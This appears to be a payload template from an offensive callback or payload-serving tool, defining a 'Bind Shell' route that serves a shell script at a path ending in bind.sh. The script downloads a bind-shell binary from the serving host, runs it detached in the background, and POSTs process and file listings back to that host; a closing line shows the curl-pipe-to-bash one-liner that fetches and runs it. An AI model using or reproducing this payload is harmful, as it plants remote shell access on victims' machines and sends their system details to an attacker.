---
title: Bind Shell
description: Requires bind-shell in static dir
weight: 1
pattern: /bind.sh$
is_final: true
data:
  headers:
    Content-Type: text/plain
  body: |
    CMD=bs
    DEST_FILE=/tmp/$CMD
    killall $CMD
    OS=$(uname)
    ARCH=$(uname -m)
    curl {{.Request.Host}}/mdaas/$OS/$ARCH/bind-shell > $DEST_FILE
    chmod +x $DEST_FILE
    bash -c "$DEST_FILE > $DEST_FILE.log 2>&1 &" &
    r=$(ps aux | grep $CMD ;cat $DEST_FILE.log; ls -lah "$DEST_FILE"*)
    disown

    echo $r
    curl "{{.Request.Host}}/l/res/" --data "$r" -X POST
---


```bash
curl xodbox/bind.sh|bash
```